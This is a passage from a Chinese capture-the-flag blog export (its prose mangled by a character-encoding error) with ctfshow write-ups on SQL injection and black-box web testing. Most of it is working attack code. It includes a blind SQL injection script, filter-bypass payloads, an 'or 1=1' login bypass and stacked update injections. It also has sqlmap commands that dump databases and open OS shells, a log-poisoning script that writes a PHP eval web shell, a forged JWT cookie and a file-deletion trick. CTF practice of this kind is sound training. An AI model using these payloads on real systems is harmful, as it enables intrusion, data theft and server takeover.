class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;ctfshow&quot;</span>+flag)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>1.<a href="https://so.csdn.net/so/search?q=format%E5%87%BD%E6%95%B0&spm=1001.2101.3001.7020">formatå‡½æ•°</a>çš„è¯­æ³•åŠç”¨æ³•</p>
<p>ï¼ˆ1ï¼‰è¯­æ³•ï¼šâ€™{}â€™.format()</p>
<p>ï¼ˆ2ï¼‰ç”¨æ³•ï¼šç”¨äºæ ¼å¼åŒ–å­—ç¬¦ä¸²ã€‚å¯ä»¥æ¥å—æ— é™ä¸ªå‚æ•°ï¼Œå¯ä»¥æŒ‡å®šé¡ºåºã€‚è¿”å›ç»“æœä¸ºå­—ç¬¦ä¸²ã€‚</p>
<p>#é»˜è®¤é¡ºåº</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;å­¦ä¹ &#123;&#125;ä¸­çš„&#123;&#125;å‡½æ•°&#x27;.format(&#x27;python&#x27;,&#x27;format&#x27;)</span><br><span class="line">-&gt;&#x27;å­¦ä¹ pythonä¸­çš„formatå‡½æ•°&#x27;</span><br></pre></td></tr></table></figure>

<p><a href="https://blog.csdn.net/weixin_50853979/article/details/125128977">https://blog.csdn.net/weixin_50853979/article/details/125128977</a></p>
<p><strong>æ­£åˆ™è¡¨è¾¾å¼ç”¨æ¥åŒ¹é…æ–‡æœ¬çš„ç‰¹æ®Šçš„ä¸²ï¼ˆå­—ç¬¦é›†åˆï¼‰ï¼ˆåŒ¹é…æ–‡æœ¬ï¼Œå°†ä¸€ä¸ªæ¨¡å¼ï¼ˆæ­£åˆ™è¡¨è¾¾å¼ï¼‰ä¸ä¸€ä¸ªæ–‡æœ¬ä¸²è¿›è¡Œæ¯”è¾ƒï¼‰</strong></p>
<p>LIKE å’Œ REGEXPä¹‹é—´çš„é‡è¦å·®åˆ«</p>
<p>LIKE åŒ¹é…æ•´ä¸ªåˆ—ï¼Œå¦‚æœè¢«åŒ¹é…çš„æ–‡æœ¬åœ¨åˆ—å€¼ä¸­å‡ºç°ï¼ŒLIKE å°†ä¸ä¼šæ‰¾åˆ°å®ƒï¼Œç›¸åº”çš„è¡Œä¹Ÿä¸ä¼šè¢«è¿”å›ï¼ˆé™¤éä½¿ç”¨é€šé…ç¬¦ï¼‰ã€‚è€Œ REGEXP åœ¨åˆ—å€¼å†…è¿›è¡ŒåŒ¹é…ï¼Œå¦‚æœè¢«åŒ¹é…çš„æ–‡æœ¬åœ¨åˆ—å€¼ä¸­å‡ºç°ï¼ŒREGEXP å°†ä¼šæ‰¾åˆ°å®ƒï¼Œç›¸åº”çš„è¡Œå°†è¢«è¿”å›ï¼Œå¹¶ä¸” REGEXP èƒ½åŒ¹é…æ•´ä¸ªåˆ—å€¼ï¼ˆä¸ LIKE ç›¸åŒçš„ä½œç”¨ï¼‰</p>
<p>   åå¼•å·ï¼Œä¸€èˆ¬åœ¨ESCé”®çš„ä¸‹æ–¹ã€‚<strong>å®ƒæ˜¯ä¸ºäº†<strong><strong>åŒºåˆ†</strong></strong>MYSQLçš„<strong><strong>ä¿ç•™å­—</strong></strong>ä¸<strong><strong>æ™®é€šå­—ç¬¦</strong></strong>è€Œå¼•å…¥çš„ç¬¦å·ã€‚</strong></p>
<p>MySQLé‡Œä½¿ç”¨ä¸€å¯¹åå‹¾å·â€œ &#96; â€å°†è¯†åˆ«ç¬¦æ‹¬èµ·æ¥ï¼Œä¸€èˆ¬æƒ…å†µä¸‹å¯ä»¥ä¸ç”¨ï¼Œ<strong>å•æ˜¯å¦‚æœè¯†åˆ«ç¬¦å‡ºç°å…³é”®å­—å†²çªæˆ–æ ‡è¯†ç¬¦çš„å†™æ³•å¯èƒ½äº§ç”Ÿæ­§ä¹‰çš„æƒ…å†µä¸‹å°±å¿…é¡»ä½¿ç”¨</strong>ã€‚</p>
<h2 id="web184"><a href="#web184" class="headerlink" title="web184"></a>web184</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//æ‹¼æ¥sqlè¯­å¥æŸ¥æ‰¾æŒ‡å®šIDç”¨æˆ·</span><br><span class="line">  $sql = &quot;select count(*) from &quot;.$_POST[&#x27;tableName&#x27;].&quot;;&quot;;</span><br><span class="line">      </span><br><span class="line"></span><br><span class="line">è¿”å›é€»è¾‘</span><br><span class="line"></span><br><span class="line">//å¯¹ä¼ å…¥çš„å‚æ•°è¿›è¡Œäº†è¿‡æ»¤</span><br><span class="line">  function waf($str)&#123;</span><br><span class="line">    return preg_match(&#x27;/\*|\x09|\x0a|\x0b|\x0c|\0x0d|\xa0|\x00|\#|\x23|file|\=|or|\x7c|select|and|flag|into|where|\x26|\&#x27;|\&quot;|union|\`|sleep|benchmark/i&#x27;, $str);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">      </span><br><span class="line"></span><br><span class="line">æŸ¥è¯¢ç»“æœ</span><br><span class="line"></span><br><span class="line">//è¿”å›ç”¨æˆ·è¡¨çš„è®°å½•æ€»æ•°</span><br><span class="line">      $user_count = 0;</span><br><span class="line">      </span><br></pre></td></tr></table></figure>

<p>whereã€å•åŒå¼•å·ã€åå¼•å·éƒ½è¢«è¿‡æ»¤äº†ï¼Œä½†æ˜¯æœ¬é¢˜æ²¡æœ‰è¿‡æ»¤ç©ºæ ¼ã€‚<br> whereå¯ä»¥ç”¨havingä»£æ›¿ï¼Œå•åŒå¼•å·å¯ä»¥ç”¨ æ‹¬å·+åå…­è¿›åˆ¶ã€‚</p>
<p>havingå’Œwhereå¯ä»¥æ›¿æ¢ï¼Œä½†æ˜¯havingè¯­å¥æœ‰ä½¿ç”¨æ¡ä»¶</p>
<p>ä¸€ä¸ªHAVINGå­å¥å¿…é¡»ä½äºGROUP BYå­å¥ä¹‹åï¼Œå¹¶ä½äºORDER BYå­å¥ä¹‹å‰ã€‚</p>
<p>tableName&#x3D;ctfshow_user group by pass having pass like 0x63746673686f777b25</p>
<p>ctfshow{}è½¬ä¸º16è¿›åˆ¶</p>
<p>ä¸Šè¿°è„šæœ¬ä¿®æ”¹dateå³å¯</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">data=&#123;</span><br><span class="line">            &quot;tableName&quot;:&quot;ctfshow_user group by pass having pass like 0x63746673686f777b&#123;&#125;25&quot;.format(&quot;&quot;.join(hex(ord(i))[2:] for i in flag+x))</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<h2 id="web185"><a href="#web185" class="headerlink" title="web185"></a>web185</h2><h2 id="web187"><a href="#web187" class="headerlink" title="web187"></a>web187</h2><p>[SQLç»•è¿‡]md5($str,true)ç±»å‹ç»•è¿‡</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ffifdyop</span><br></pre></td></tr></table></figure>

<p><a href="https://blog.csdn.net/March97/article/details/81222922">(4æ¡æ¶ˆæ¯) sqlæ³¨å…¥ï¼šmd5($password,true)_March97çš„åšå®¢-CSDNåšå®¢</a></p>
<p>æŠ“åŒ…è¿”å›ç»“æœå³å¯çœ‹åˆ°flag</p>
<h2 id="web188â€“MYSQLçš„å¼±æ¯”è¾ƒ"><a href="#web188â€“MYSQLçš„å¼±æ¯”è¾ƒ" class="headerlink" title="web188â€“MYSQLçš„å¼±æ¯”è¾ƒ"></a>web188â€“MYSQLçš„å¼±æ¯”è¾ƒ</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//æ‹¼æ¥sqlè¯­å¥æŸ¥æ‰¾æŒ‡å®šIDç”¨æˆ·</span><br><span class="line">$sql = &quot;select pass from ctfshow_user where username = &#123;$username&#125;&quot;;</span><br><span class="line">    </span><br></pre></td></tr></table></figure>

<p>è¿”å›é€»è¾‘</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//ç”¨æˆ·åæ£€æµ‹</span><br><span class="line">if(preg_match(&#x27;/and|or|select|from|where|union|join|sleep|benchmark|,|\(|\)|\&#x27;|\&quot;/i&#x27;, $username))&#123;</span><br><span class="line">  $ret[&#x27;msg&#x27;]=&#x27;ç”¨æˆ·åéæ³•&#x27;;</span><br><span class="line">  die(json_encode($ret));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//å¯†ç æ£€æµ‹</span><br><span class="line">if(!is_numeric($password))&#123;</span><br><span class="line">  $ret[&#x27;msg&#x27;]=&#x27;å¯†ç åªèƒ½ä¸ºæ•°å­—&#x27;;</span><br><span class="line">  die(json_encode($ret));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//å¯†ç åˆ¤æ–­</span><br><span class="line">if($row[&#x27;pass&#x27;]==intval($password))&#123;</span><br><span class="line">    $ret[&#x27;msg&#x27;]=&#x27;ç™»é™†æˆåŠŸ&#x27;;</span><br><span class="line">    array_push($ret[&#x27;data&#x27;], array(&#x27;flag&#x27;=&gt;$flag));</span><br><span class="line">  &#125;</span><br><span class="line">    </span><br></pre></td></tr></table></figure>

<p>ç”¨æˆ·ç™»é™†</p>
<p>ç”¨æˆ·å:   </p>
<p>å¯†ç :</p>
<p>å¯¹äºusernameçš„ç»•è¿‡ï¼Œä¸€ç§æ˜¯åˆ©ç”¨mysqlé‡Œé¢çš„å¼±æ¯”è¾ƒç±»å‹ï¼Œå­—ç¬¦ä¸²å’Œæ•°å­—æ¯”è¾ƒæ—¶ï¼Œå­—ç¬¦ä¸²æ°¸è¿œåŒ–ä½œ0</p>
<p>å»æ¯”è¾ƒï¼Œæœ‰ç‚¹åƒphpçš„æ¯”è¾ƒä¸€æ ·ï¼Œæ‰€ä»¥ï¼Œè¿™é‡Œå¯ä»¥ç”¨0ç»•è¿‡ï¼Œè¿˜æœ‰ä¸€ç§å°±æ˜¯é€šè¿‡é€»è¾‘ï¼Œåœ¨è¿ç®—çš„æ—¶å€™å¯¹ </p>
<p>|| ï¼Œä¸€çœŸåˆ™çœŸï¼Œå°±ç»•è¿‡äº†ã€‚æ¥ä¸‹æ¥å°±æ˜¯phpé‡Œé¢å¸¸è§çš„intval()å‡½æ•°çš„ç»•è¿‡ï¼Œpasswordåº”è¯¥æ˜¯å­—ç¬¦å¼€å¤´</p>
<p>çš„æ•°æ®ï¼Œå­—ç¬¦ä¸²ä¼šå˜0æ¥è¿›è¡Œè¿™ç§å¼±æ¯”è¾ƒï¼Œæ‰€ä»¥passwordä¹Ÿä¸º0å°±è¡Œã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=0&amp;password=0 </span><br><span class="line"></span><br><span class="line">username=1||1&amp;password=0</span><br></pre></td></tr></table></figure>

<p>ç™»å½•æˆåŠŸå</p>
<p>f12  crtl+r</p>
<p>æ‰“å¼€ç½‘ç»œapiæ–‡ä»¶å³ä½¿ç™»é™†åçš„æ–‡ä»¶</p>
<p>ctfshow{1374102b-8d14-4716-8f93-daba7274e984}</p>
<h2 id="web190"><a href="#web190" class="headerlink" title="web190"></a>web190</h2><p>å¸ƒå°”ç›²æ³¨ï¼ŒäºŒåˆ†æ³•</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url = &quot;http://d27e3b82-15f0-4e91-963c-859afc7ecaab.challenge.ctf.show/api/&quot;</span><br><span class="line"></span><br><span class="line">result = &quot;&quot;</span><br><span class="line">i = 0</span><br><span class="line"></span><br><span class="line">while True:</span><br><span class="line">    i = i + 1</span><br><span class="line">    head = 32</span><br><span class="line">    tail = 127</span><br><span class="line">    while head &lt; tail:</span><br><span class="line">        mid = (head + tail) &gt;&gt; 1</span><br><span class="line">        # æŸ¥æ•°æ®åº“</span><br><span class="line">         # payload = &quot;select group_concat(schema_name) from information_schema.schemata&quot;</span><br><span class="line">        #æŸ¥æ•°æ®åº“</span><br><span class="line">       #  payload=&quot;select group_concat(table_name) from information_schema.tables where table_schema=&#x27;ctfshow_web&#x27;&quot;</span><br><span class="line">        # æŸ¥å­—æ®µ</span><br><span class="line">        # payload = &quot;select group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_fl0g&#x27;&quot;</span><br><span class="line">        # æŸ¥flag</span><br><span class="line">       # payload = &quot;select group_concat(f1ag) from ctfshow_fl0g&quot;</span><br><span class="line">        data = &#123;</span><br><span class="line">            &#x27;username&#x27;: f&quot;admin&#x27; and if(ascii(substr((&#123;payload&#125;),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,2)=&#x27;1&quot;,</span><br><span class="line">            &#x27;password&#x27;: &#x27;1&#x27;</span><br><span class="line">        &#125;</span><br><span class="line">        r = requests.post(url,data=data)</span><br><span class="line">        if &quot;å¯†ç é”™è¯¯&quot;  == r.json()[&#x27;msg&#x27;]:</span><br><span class="line">            head = mid + 1</span><br><span class="line">        else:</span><br><span class="line">            tail = mid</span><br><span class="line">    if head != 32:</span><br><span class="line">        result += chr(head)</span><br><span class="line">    else:</span><br><span class="line">        break</span><br><span class="line">    print(result)</span><br></pre></td></tr></table></figure>



<h2 id="web201"><a href="#web201" class="headerlink" title="web201"></a>web201</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u http://c159ec4b-0c97-48b2-9350-4922786e23ba.challenge.ctf.show/api/index.php?id= --referer=&quot;http://c159ec4b-0c97-48b2-9350-4922786e23ba.challenge.ctf.show/sqlmap.php&quot; --dump</span><br></pre></td></tr></table></figure>

<p>â€“dumpæ˜¾ç¤ºæ‰€æœ‰å­—æ®µ</p>
<p>ä¸ºå•¥æ˜¯api æˆ‘ä¹Ÿä¸æ‡‚d</p>
<p>æ³¨æ„æ²¡æœ‰refererå¦åˆ™çˆ†ä¸å‡ºæ¥</p>
<p>ctfshow{b651c961-4e84-4d79-a08c-42114b092c45}</p>
<h2 id="web202"><a href="#web202" class="headerlink" title="web202"></a>web202</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u http://4c8bde6f-bec8-4883-9e9c-b7605367c3df.challenge.ctf.show/api/ --data=&quot;id=1&quot; --referer=&quot;http://4c8bde6f-bec8-4883-9e9c-b7605367c3df.challenge.ctf.show/sqlmap&quot; --dump</span><br></pre></td></tr></table></figure>

<p>æ³¨æ„æ˜¯dataåˆ«æ‹¼é”™äº†</p>
<p>ctfshow{165ee80d-8978-4e45-beb4-5e907b5fa988}</p>
<h2 id="web203"><a href="#web203" class="headerlink" title="web203"></a>web203</h2><p>â€“method&#x3D; ä¿®æ”¹sqlmapçš„æäº¤æ–¹å¼ï¼Œä»¥ä»€ä¹ˆæ–¹å¼æäº¤ </p>
<p>Content-Typeï¼šç”¨äºå®šä¹‰ç”¨æˆ·çš„æµè§ˆå™¨æˆ–ç›¸å…³è®¾å¤‡å¦‚ä½•æ˜¾ç¤ºå°†è¦åŠ è½½çš„æ•°æ®ï¼Œæˆ–è€…å¦‚ä½•å¤„ç†å°†è¦åŠ è½½çš„æ•°æ®</p>
<p>ã€€ã€€MIMEï¼šMIMEç±»å‹å°±æ˜¯è®¾å®šæŸç§æ‰©å±•åçš„æ–‡ä»¶ç”¨ä¸€ç§åº”ç”¨ç¨‹åºæ¥æ‰“å¼€çš„æ–¹å¼ç±»å‹ï¼Œå½“è¯¥æ‰©å±•åæ–‡ä»¶è¢«è®¿é—®çš„æ—¶å€™ï¼Œæµè§ˆå™¨ä¼šè‡ªåŠ¨ä½¿ç”¨æŒ‡å®šåº”ç”¨ç¨‹åºæ¥æ‰“å¼€ã€‚å¤šç”¨äºæŒ‡å®šä¸€äº›å®¢æˆ·ç«¯è‡ªå®šä¹‰çš„æ–‡ä»¶åï¼Œä»¥åŠä¸€äº›åª’ä½“æ–‡ä»¶æ‰“å¼€æ–¹å¼ã€‚</p>
<p>text&#x2F;htmlçš„æ„æ€æ˜¯å°†æ–‡ä»¶çš„content-typeè®¾ç½®ä¸ºtext&#x2F;htmlçš„å½¢å¼ï¼Œæµè§ˆå™¨åœ¨è·å–åˆ°è¿™ç§æ–‡ä»¶æ—¶ä¼šè‡ªåŠ¨è°ƒç”¨htmlçš„è§£æå™¨å¯¹æ–‡ä»¶è¿›è¡Œç›¸åº”çš„å¤„ç†ã€‚</p>
<p>text&#x2F;plainçš„æ„æ€æ˜¯å°†æ–‡ä»¶è®¾ç½®ä¸ºçº¯æ–‡æœ¬çš„å½¢å¼ï¼Œæµè§ˆå™¨åœ¨è·å–åˆ°è¿™ç§æ–‡ä»¶æ—¶å¹¶ä¸ä¼šå¯¹å…¶è¿›è¡Œå¤„ç†ã€‚</p>
<p>PUTæäº¤æ–¹å¼è¦æ³¨æ„ï¼Œä¿®æ”¹headersä¸ºContent-Type: text&#x2F;plainï¼Œå¦åˆ™é»˜è®¤ä¸ºè¡¨å•å‘é€ï¼ŒPUTè¯·æ±‚æ¥å—ä¸åˆ°.</p>
<p><a href="https://www.cnblogs.com/mmzuo-798/p/11634055.html">https://www.cnblogs.com/mmzuo-798/p/11634055.html</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u http://bde36fa6-18e9-4375-999a-b797506078f2.challenge.ctf.show/api/index.php --method=&quot;PUT&quot; --header=&quot;Content-Type:text/plain&quot; --referer=&quot;http://bde36fa6-18e9-4375-999a-b797506078f2.challenge.ctf.show/sqlmap.php&quot; --dump --data=&quot;id=1&quot;</span><br></pre></td></tr></table></figure>

<p>ctfshow{af320e41-a9df-44e1-b286-3e61d4e4b33b}</p>
<h2 id="web195"><a href="#web195" class="headerlink" title="web195"></a>web195</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1;update(ctfshow_user)set`username`=1;</span><br><span class="line">1;update(ctfshow_user)set`pass`=1;</span><br></pre></td></tr></table></figure>

<p>æ³¨å…¥åˆ°ç”¨æˆ·åä¸­</p>
<p>ï¼Œå¯†ç ä¸º1ï¼Œè´¦å·ä¸º1</p>
<h2 id="web204"><a href="#web204" class="headerlink" title="web204"></a>web204</h2><h2 id="web253"><a href="#web253" class="headerlink" title="web253"></a>web253</h2>]]></content>
      <categories>
        <category>sql</category>
      </categories>
      <tags>
        <tag>ctfshow</tag>
        <tag>sql</tag>
      </tags>
  </entry>
  <entry>
    <title>ctfshow-é»‘ç›’æµ‹è¯•</title>
    <url>/2023/04/16/ctfshow-%E9%BB%91%E7%9B%92%E6%B5%8B%E8%AF%95/</url>
    <content><![CDATA[<p>  ctfshow é»‘ç›’æµ‹è¯•</p>
  <span id="more"></span>

<h2 id="web381"><a href="#web381" class="headerlink" title="web381"></a>web381</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://81d1568a-588d-4fc9-abeb-369f884876f7.challenge.ctf.show/alsckdfy/</span><br></pre></td></tr></table></figure>

<p>è®¿é—®è¿™ä¸ªåœ°å€å³å¯</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;head&gt;</span><br><span class="line">  &lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">  &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1, maximum-scale=1&quot;&gt;</span><br><span class="line">  &lt;title&gt;CTFshowèŒæ–°åšå®¢&lt;/title&gt;</span><br><span class="line">  &lt;link rel=&quot;stylesheet&quot; href=&quot;layui/css/layui.css&quot;&gt;</span><br><span class="line">  &lt;link rel=&quot;stylesheet&quot; href=&quot;layui/css/global.css&quot;&gt;</span><br><span class="line">  &lt;link rel=&quot;stylesheet&quot; href=&quot;alsckdfy/layui/css/tree.css&quot;&gt;</span><br><span class="line">&lt;/head&gt;</span><br></pre></td></tr></table></figure>

<p>è¿™ä¸ªåœ°å€åœ¨æºç é‡Œå¯ä»¥çœ‹åˆ°</p>
<h2 id="web382-web383"><a href="#web382-web383" class="headerlink" title="web382,web383"></a>web382,web383</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://81d1568a-588d-4fc9-abeb-369f884876f7.challenge.ctf.show/alsckdfy/</span><br></pre></td></tr></table></figure>

<p>è®¿é—®è¿™é‡Œï¼Œä¸‡èƒ½å¯†ç ç™»å½•å³å¯</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;or 1=1-- -</span><br></pre></td></tr></table></figure>

<h2 id="web384"><a href="#web384" class="headerlink" title="web384"></a>web384</h2><p>ç”Ÿæˆå­—å…¸çš„è„šæœ¬</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import string</span><br><span class="line">s1=string.ascii_lowercase</span><br><span class="line">s2=string.digits</span><br><span class="line">f=open(&#x27;dict.txt&#x27;,&#x27;w&#x27;)</span><br><span class="line">for i in s1:</span><br><span class="line">	for j in s1:</span><br><span class="line">		for k in s2:</span><br><span class="line">			for l in s2:</span><br><span class="line">				for m in s2:</span><br><span class="line">					p=i+j+k+l+m</span><br><span class="line">					f.write(p+&quot;\n&quot;)</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure>

<h2 id="web385"><a href="#web385" class="headerlink" title="web385"></a>web385</h2><p>æ‰«ä¸€ä¸‹ï¼Œå‘ç°install</p>
<p>è®¿é—®ä¸€ä¸‹ï¼Œå‡ºç°</p>
<p>è¯·åŠ¡å¿…åœ¨å®‰è£…æˆåŠŸååˆ é™¤æœ¬æ–‡ä»¶<br>éœ€è¦é‡æ–°å®‰è£…è¯·è®¿é—®install&#x2F;?install,ç®¡ç†å‘˜å¯†ç å°†é‡ç½®ä¸ºé»˜è®¤å¯†ç </p>
<p>è®¿é—®ä¸€ä¸‹&#x2F;install&#x2F;?install</p>
<p>å†æ¬¡ç™»å½•&#x2F;alsckdfy&#x2F;</p>
<p>åˆå§‹æˆ·åå¯†ç <code>admin admin888</code></p>
<p>è¿™æ˜¯ç”±ä¹‹å‰çš„é¢˜å¾—å‡ºæ¥çš„</p>
<h2 id="web386"><a href="#web386" class="headerlink" title="web386"></a>web386</h2><p>è®¿é—®install</p>
<p>lock.datå­˜åœ¨ï¼Œä½ å·²ç»å®‰è£…è¿‡äº†ï¼Œè¯·å‹¿é‡å¤å®‰è£…</p>
<p>è®¿é—®clear.php,çŒœä¸€æ‰‹ï¼Œfileå‚æ•°åˆ é™¤æ–‡ä»¶</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/clear.php?file=index.php</span><br></pre></td></tr></table></figure>

<p>ç„¶åé¡µé¢å°±æ²¡æ²¡äº†</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/clear.php?file=install/lock.php</span><br></pre></td></tr></table></figure>

<p>ç»§ç»­è®¿é—®</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/alsckdfy/     ç™»å½•å³å¯</span><br></pre></td></tr></table></figure>

<h2 id="web387"><a href="#web387" class="headerlink" title="web387"></a>web387</h2><p>robots.txtå­˜åœ¨&#x2F;debug</p>
<p>è®¿é—®debug</p>
<p>å†…å®¹æ˜¯</p>
<p>file not exist</p>
<p>çŒœä¸€ä¸‹æ˜¯ä¼ é€’ä¸€ä¸ªfileå‚æ•°ï¼Œæ–‡ä»¶åŒ…å«</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/debug?file=/var/log/nginx/access.log</span><br></pre></td></tr></table></figure>

<p>æ— æ³•å†™å…¥é©¬ï¼Œå‘½ä»¤æ‰§è¡Œæ— å›æ˜¾</p>
<p>ç›´æ¥å°è¯•</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php system(&#x27;cat /var/www/html/alsckdfy/check.php&gt;/var/www/html/1.txt&#x27;);?&gt;</span><br></pre></td></tr></table></figure>

<h2 id="web388"><a href="#web388" class="headerlink" title="web388"></a>web388</h2><p>å†™å…¥ç»•è¿‡</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">import base64</span><br><span class="line">url=&quot;http://1dbe73d8-655c-4c06-a9c2-057cd44eaf2f.challenge.ctf.show/&quot;</span><br><span class="line">url2=&quot;http://1dbe73d8-655c-4c06-a9c2-057cd44eaf2f.challenge.ctf.show//debug/?file=/var/log/nginx/access.log&quot;</span><br><span class="line">cmd=b&quot;&lt;?php eval($_POST[1]);?&gt;&quot;</span><br><span class="line">cmd=base64.b64encode(cmd).decode()</span><br><span class="line">headers=&#123;</span><br><span class="line">	&#x27;User-Agent&#x27;:&#x27;&#x27;&#x27;&lt;?php system(&#x27;echo &#123;0&#125;|base64 -d  &gt; /var/www/html/b.php&#x27;);?&gt;&#x27;&#x27;&#x27;.format(cmd)</span><br><span class="line">&#125;</span><br><span class="line">print(headers)</span><br><span class="line">requests.get(url=url,headers=headers)</span><br><span class="line">requests.get(url2)</span><br><span class="line">print(requests.post(url+&#x27;b.php&#x27;,data=&#123;&#x27;1&#x27;:&#x27;system(&quot;cat alsckdfy/check.php&quot;);&#x27;&#125;).text)</span><br></pre></td></tr></table></figure>

<h2 id="web389"><a href="#web389" class="headerlink" title="web389"></a>web389</h2><p>jwt ä¼ªé€ ï¼Œ</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">import base64</span><br><span class="line">url=&quot;http://bf2e6fca-c437-4f5b-90c3-75b4087cfdc5.chall.ctf.show/&quot;</span><br><span class="line">url2=&quot;http://bf2e6fca-c437-4f5b-90c3-75b4087cfdc5.chall.ctf.show/debug/?file=/var/log/nginx/access.log&quot;</span><br><span class="line">cmd=b&quot;&lt;?php eval($_POST[1]);?&gt;&quot;</span><br><span class="line">cmd=base64.b64encode(cmd).decode()</span><br><span class="line">headers=&#123;</span><br><span class="line">	&#x27;User-Agent&#x27;:&#x27;&#x27;&#x27;&lt;?php system(&#x27;echo &#123;0&#125;|base64 -d  &gt; /var/www/html/b.php&#x27;);?&gt;&#x27;&#x27;&#x27;.format(cmd),</span><br><span class="line">	&#x27;Cookie&#x27;:&#x27;auth=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJhZG1pbiIsImlhdCI6MTYxMDQ0MDA5MSwiZXhwIjoxNjEwNDQ3MjkxLCJuYmYiOjE2MTA0NDAwOTEsInN1YiI6ImFkbWluIiwianRpIjoiYzNlM2U5NjQ4OGI3NWY0MzY4YmE4Njg0ZTRjZWJlZTQifQ.hEV8CkkdvhKsNL_OrssrBzjzstVhq7_sQNefiuplSqU&#x27;</span><br><span class="line">&#125;</span><br><span class="line">print(headers)</span><br><span class="line">requests.get(url=url,headers=headers)</span><br><span class="line">requests.get(url2,headers=headers)</span><br><span class="line">print(requests.post(url+&#x27;b.php&#x27;,data=&#123;&#x27;1&#x27;:&#x27;system(&quot;cat alsckdfy/check.php&quot;);&#x27;&#125;,headers=headers).text)</span><br></pre></td></tr></table></figure>



<h2 id="web390"><a href="#web390" class="headerlink" title="web390"></a>web390</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u http://6db122df-7ba0-4835-bb91-00984aed8475.challenge.ctf.show/page.php?id=1 --os-shell -batch </span><br></pre></td></tr></table></figure>

<p>ç›´æ¥æ‹¿åˆ°shell,ä½†è¿™ä¸ªshellå¥½åƒåªæœ‰cat æƒé™ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap.py -u http://fdbabc63-b2f3-4050-8b2e-9f5ee609119a.chall.ctf.show/page.php?id=2 --file-read /var/www/html/alsckdfy/check.php --batch</span><br></pre></td></tr></table></figure>

<p>è¿è¡Œå®Œä¼šå°†æ–‡ä»¶ä¿å­˜åœ¨ä½ çš„æœ¬åœ°ï¼Œç›´æ¥è®¿é—®å°±æ‹¿åˆ°flag</p>
<h2 id="web391"><a href="#web391" class="headerlink" title="web391"></a>web391</h2><p>å·¦ä¸Šè§’å‡ºæ¥ä¸€ä¸ªèŒæ–°å¾€äº‹ï¼Œè¿™ä¸ªçŒœä¸€ä¸‹å°±çŸ¥é“æ˜¯æ³¨å…¥ç‚¹</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u http://86300148-3fae-429c-bd62-2397e24809b8.challenge.ctf.show/search.php?title=123 --os-shell --batch</span><br></pre></td></tr></table></figure>

<h2 id="web392"><a href="#web392" class="headerlink" title="web392"></a>web392</h2><p>å¦‚ä¸Š391</p>
<h2 id="web393"><a href="#web393" class="headerlink" title="web393"></a>web393</h2><p>åœ¨èŒæ–°å¾€äº‹é‡Œæœ‰æ³¨å…¥ç‚¹æœç´¢</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u http://1ad914e4-74b3-4f2b-8aa9-d8ea8e9755e8.challenge.ctf.show/search.php?title=123 --current-db</span><br></pre></td></tr></table></figure>

<p>æ•°æ®åº“ctfshow</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u http://94520176-d91c-4e45-8f53-206a179b60f7.challenge.ctf.show/search.php?title=4 -D &#x27;ctfshow&#x27; --tables</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">admin_user |</span><br><span class="line">| content    |</span><br><span class="line">| link </span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u http://1ad914e4-74b3-4f2b-8aa9-d8ea8e9755e8.challenge.ctf.show/search.php?title=123 -D ctfshow -T link --columns</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">| Column | Type         |</span><br><span class="line">+--------+--------------+</span><br><span class="line">| id     | int(11)      |</span><br><span class="line">| name   | varchar(255) |</span><br><span class="line">| url    | varchar(255) </span><br></pre></td></tr></table></figure>

<p>å †å æ³¨å…¥</p>
